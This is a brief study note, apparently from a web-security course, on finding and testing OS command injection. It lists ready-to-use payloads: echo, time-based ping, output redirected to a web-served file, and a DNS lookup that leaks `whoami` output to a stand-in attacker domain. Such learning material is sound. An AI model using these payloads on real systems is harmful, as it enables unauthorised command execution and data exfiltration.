### Where to look

- Look for parameters in the URL or POST body that may  pass values to an OS level command line. 

### What to try

- Regular Command Injection: `& echo aiwefwlguh &`
- Time Based Blind Command Injection: `& ping -c 10 127.0.0.1 &`
- Redirected Output Blind Command Injection: `& whoami > /var/www/static/whoami.txt &`
- DNS Based OAST Blind Command Injection: ``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`

### More Details

More details can be found at [[Cyber Security/Learning/Web Security Academy/Command Injection|Command Injection]]
